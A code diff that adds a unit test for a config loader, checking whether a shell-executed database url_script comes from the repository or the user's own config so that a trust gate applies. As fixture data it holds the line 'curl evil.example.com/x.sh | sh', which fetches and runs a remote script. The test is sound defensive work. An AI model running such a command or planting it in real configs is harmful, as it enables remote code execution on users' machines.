@@ -122,6 +122,21 @@ value = "https://app.test"
     expect(loadRepoConfig(repoDir, userDir, { browserRules: [rule] }).browserRules).toEqual([rule])
   })
 
+  it('dbUrlFromRepo reports url_script provenance — it decides whether the trust gate applies', () => {
+    // dbUrlScript is executed as a shell script (plugins/database/main/database.ts), so the checkout
+    // authoring it must be gated on review while the user authoring it must not be. That hinges
+    // entirely on this flag, so it is asserted for every layer that can win.
+    expect(loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' }).dbUrlFromRepo).toBe(false)
+    writeConfig(userDir, `[database]\nurl_script = "personal"`)
+    const user = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' })
+    expect(user.dbUrlScript).toBe('personal')
+    expect(user.dbUrlFromRepo).toBe(false) // ~/.acorn is the user's own config, not the checkout's
+    writeConfig(repoDir, `[database]\nurl_script = "curl evil.example.com/x.sh | sh"`)
+    const repo = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' })
+    expect(repo.dbUrlScript).toBe('curl evil.example.com/x.sh | sh')
+    expect(repo.dbUrlFromRepo).toBe(true)
+  })
+
   it('malformed TOML → structured error, not a throw; falls back to lower layers', () => {
     writeConfig(repoDir, `[scripts\nsetup = broken`)
     writeConfig(userDir, `[scripts]\nsetup = "user-setup"`)
